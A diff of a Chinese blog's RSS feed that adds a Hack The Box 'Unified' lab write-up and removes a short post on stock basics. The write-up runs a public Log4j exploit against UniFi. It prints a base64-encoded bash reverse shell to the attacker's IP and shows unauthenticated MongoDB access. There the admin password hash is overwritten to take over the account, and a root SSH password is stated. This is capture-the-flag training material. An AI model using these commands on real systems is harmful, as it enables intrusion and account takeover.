@@ -12,12 +12,126 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Thu, 26 Mar 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 28 Mar 2026 00:00:00 +0000</lastBuildDate>
     
     
     <atom:link href="https://test692618.github.io/post/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>htb-Unified</title>
+      <link>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-unified/</link>
+      <pubDate>Sat, 28 Mar 2026 00:00:00 &#43;0000</pubDate>
+      <author>knock_s@foxmial.com (L)</author>
+      <guid>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-unified/</guid>
+      <description>
+        <![CDATA[<h1>htb-Unified</h1><p>作者：L（knock_s@foxmial.com）</p>
+        
+          <h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">6789/tcp open  ibm-db2-admin
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy
+</span></span><span class="line"><span class="cl">8443/tcp open  https-alt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//8080，8443指向同一个网站；6789可能是DB2数据库 或 UniFi网络控制器用于UniFi移动速度测试的TCP端口。
+</span></span></code></pre></div><h2 id="网站测试">
+<a class="header-anchor" href="#%e7%bd%91%e7%ab%99%e6%b5%8b%e8%af%95"></a>
+网站测试
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//该网站服务为 UniFi Network 版本 6.4.54，该服务存在的漏洞就是大名鼎鼎log4j（CVE-2021-44228）
+</span></span><span class="line"><span class="cl">//直接下载exp，地址：https://github.com/puzzlepeaches/Log4jUnifi
+</span></span><span class="line"><span class="cl">//exp一把梭
+</span></span><span class="line"><span class="cl">sudo nc -lvvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">sudo python3 exploit.py -u https://10.129.96.149:8443/ -i 10.10.16.65 -p <span class="m">4444</span>
+</span></span></code></pre></div><h2 id="权限提升">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+权限提升
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ sudo nc -lvvp <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">10.129.96.149: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.65<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.149<span class="o">]</span> <span class="m">38070</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/usr/lib/unifi
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">unifi   // 获得低权限shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------------------------------------------
+</span></span><span class="line"><span class="cl">//查看进程时发现运行mongodb服务。注意到mongodb数据库仅本地监听，且端口时27117，非默认端口。
+</span></span><span class="line"><span class="cl">ps -aux
+</span></span><span class="line"><span class="cl">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+</span></span><span class="line"><span class="cl">unifi          <span class="m">1</span>  0.0  0.0   <span class="m">1080</span>     <span class="m">4</span> ?        Ss   12:35   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
+</span></span><span class="line"><span class="cl">unifi          <span class="m">7</span>  0.0  0.1  <span class="m">18512</span>  <span class="m">3176</span> ?        S    12:35   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
+</span></span><span class="line"><span class="cl">unifi         <span class="m">17</span>  2.5 22.6 <span class="m">3670820</span> <span class="m">460968</span> ?      Sl   12:35   0:35 java -Dunifi.datadir<span class="o">=</span>/unifi/data -Dunifi.logdir<span class="o">=</span>/unifi/log -Dunifi.rundir<span class="o">=</span>/var/run/unifi -Xmx1024M -Djava.awt.headless<span class="o">=</span><span class="nb">true</span> -Dfile.encoding<span class="o">=</span>UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
+</span></span><span class="line"><span class="cl">unifi         <span class="m">67</span>  0.3  4.1 <span class="m">1100676</span> <span class="m">84600</span> ?       Sl   12:35   0:05 bin/mongod --dbpath /usr/lib/unifi/data/db --port <span class="m">27117</span> --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+</span></span><span class="line"><span class="cl">unifi        <span class="m">600</span>  0.0  0.1  <span class="m">18380</span>  <span class="m">3136</span> ?        S    12:51   0:00 bash -c <span class="o">{</span>echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNjUvNDQ0NCAwPiYx<span class="o">}</span><span class="p">|</span><span class="o">{</span>base64,-d<span class="o">}</span><span class="p">|</span><span class="o">{</span>bash,-i<span class="o">}</span>
+</span></span><span class="line"><span class="cl">unifi        <span class="m">604</span>  0.0  0.1  <span class="m">18512</span>  <span class="m">3328</span> ?        S    12:51   0:00 bash -i
+</span></span><span class="line"><span class="cl">unifi        <span class="m">607</span>  0.0  0.1  <span class="m">18380</span>  <span class="m">3180</span> ?        S    12:51   0:00 bash
+</span></span><span class="line"><span class="cl">unifi        <span class="m">789</span>  0.0  0.1  <span class="m">34408</span>  <span class="m">2916</span> ?        R    12:58   0:00 ps -aux
+</span></span><span class="line"><span class="cl">mongo -p^H
+</span></span><span class="line"><span class="cl">MongoDB shell version v3.6.3
+</span></span><span class="line"><span class="cl">connecting to: mongodb://127.0.0.1:27017
+</span></span><span class="line"><span class="cl">2026-03-28T12:59:09.156+0000 W NETWORK  <span class="o">[</span>thread1<span class="o">]</span> Failed to connect to 127.0.0.1:27017, in<span class="o">(</span>checking socket <span class="k">for</span> error after poll<span class="o">)</span>, reason: Connection refused
+</span></span><span class="line"><span class="cl">2026-03-28T12:59:09.158+0000 E QUERY    <span class="o">[</span>thread1<span class="o">]</span> Error: couldn<span class="s1">&#39;t connect to server 127.0.0.1:27017, connection attempt failed :
+</span></span></span><span class="line"><span class="cl"><span class="s1">connect@src/mongo/shell/mongo.js:251:13
+</span></span></span><span class="line"><span class="cl"><span class="s1">@(connect):1:6
+</span></span></span><span class="line"><span class="cl"><span class="s1">exception: connect failed
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//使用mongo工具直接本地访问，指定27117端口。mongodb数据库未设置本地身份校验。
+</span></span></span><span class="line"><span class="cl"><span class="s1">mongo --port 27117
+</span></span></span><span class="line"><span class="cl"><span class="s1">MongoDB shell version v3.6.3
+</span></span></span><span class="line"><span class="cl"><span class="s1">connecting to: mongodb://127.0.0.1:27117/
+</span></span></span><span class="line"><span class="cl"><span class="s1">MongoDB server version: 3.6.3
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//列出数据库，注意到仅ace库中数据存储最大。
+</span></span></span><span class="line"><span class="cl"><span class="s1">show dbs                                                                                                           
+</span></span></span><span class="line"><span class="cl"><span class="s1">ace       0.002GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">ace_stat  0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin     0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">config    0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">local     0.000GB
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//运行该命令查询：db.admin.find().forEach(printjson)
+</span></span></span><span class="line"><span class="cl"><span class="s1">//db.admin.find()：查询admin表下的所有数据，即查询所有用户
+</span></span></span><span class="line"><span class="cl"><span class="s1">//forEach():遍历
+</span></span></span><span class="line"><span class="cl"><span class="s1">//printjson:json格式打印
+</span></span></span><span class="line"><span class="cl"><span class="s1">db.admin.find().forEach(printjson)                                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="s1">{                                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;_id&#34; : ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;),                                                               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;name&#34; : &#34;administrator&#34;,                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;email&#34; : &#34;administrator@unified.htb&#34;,                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;x_shadow&#34; : &#34;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#34;,               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;time_created&#34; : NumberLong(1640900495),                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;last_site_name&#34; : &#34;default&#34;,                                                                               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;ui_settings&#34; : {          
+</span></span></span><span class="line"><span class="cl"><span class="s1">//注意到name和x_shadow，x_shadow为密码hash。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//这里有两种思路，一是对hash值暴力破解，二是通过db.admin.update()函数修改x_shadow。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//经测试，第一种思路尝试暴力破解失败。现在采取第二种思路。
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//step.1 使用hashid工具，得知该hash为sha-512的hash值。
+</span></span></span><span class="line"><span class="cl"><span class="s1">hashid &#39;</span><span class="nv">$6$Ry6Vdbse$8</span>enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//step.2 使用mkpasswd工具，生成hash值。
+</span></span><span class="line"><span class="cl">mkpasswd -m sha-512 <span class="m">123456</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$6$hQDwYPIT1sfBF1D6$OaJn4x3fhbA</span>/.PG3C41C8oYii66ad5Ny7eE6UwGJkppz0G6bwg/meSC243XZFuJb7ccoMwZl0HQj4JlFoK1Vs/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//step.3 通过db.admin.update<span class="o">()</span>函数修改x_shadow
+</span></span><span class="line"><span class="cl">db.admin.update<span class="o">({</span><span class="s2">&#34;_id&#34;</span>:ObjectId<span class="o">(</span><span class="s2">&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class="o">)}</span>,<span class="o">{</span><span class="nv">$set</span>:<span class="o">{</span><span class="s2">&#34;x_shadow&#34;</span>:<span class="s2">&#34;</span><span class="nv">$6$hQDwYPIT1sfBF1D6$OaJn4x3fhbA</span><span class="s2">/.PG3C41C8oYii66ad5Ny7eE6UwGJkppz0G6bwg/meSC243XZFuJb7ccoMwZl0HQj4JlFoK1Vs/&#34;</span><span class="o">}})</span>
+</span></span></code></pre></div><p>登录后，在setting界面，site选项中发现root账户的ssh连接密码：NotACrackablePassword4U2022</p>
+        
+        <hr><p>本文2026-03-28首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-03-28</p>]]>
+      </description>
+      
+        <category>HTB</category>
+      
+    </item>
     
     
 
@@ -508,35 +622,6 @@ APK文件结构
       </description>
       
         <category>读书笔记</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>认识股票</title>
-      <link>https://test692618.github.io/post/%E7%BB%8F%E6%B5%8E%E4%B8%8E%E9%87%91%E8%9E%8D%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E4%BB%80%E4%B9%88%E6%98%AF%E8%82%A1%E7%A5%A8/</link>
-      <pubDate>Wed, 13 Mar 2024 20:15:13 &#43;0000</pubDate>
-      <author>knock_s@foxmial.com (L)</author>
-      <guid>https://test692618.github.io/post/%E7%BB%8F%E6%B5%8E%E4%B8%8E%E9%87%91%E8%9E%8D%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E4%BB%80%E4%B9%88%E6%98%AF%E8%82%A1%E7%A5%A8/</guid>
-      <description>
-        <![CDATA[<h1>认识股票</h1><p>作者：L（knock_s@foxmial.com）</p>
-        
-          <h2 id="概念">
-<a class="header-anchor" href="#%e6%a6%82%e5%bf%b5"></a>
-概念
-</h2><p>股本：公司全部的股票数量。</p>
-<p>股价：单个股票的价格。股价是按当前时刻的最高成交价去定价的。</p>
-<h2 id="证券交易所">
-<a class="header-anchor" href="#%e8%af%81%e5%88%b8%e4%ba%a4%e6%98%93%e6%89%80"></a>
-证券交易所
-</h2><p>证券交易所是用于 股票交易的场所。</p>
-<p>公司上市的意思就是可在证券交易所发行股票。</p>
-        
-        <hr><p>本文2024-03-13首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2024-03-13</p>]]>
-      </description>
-      
-        <category>经济与金融</category>
       
     </item>
     
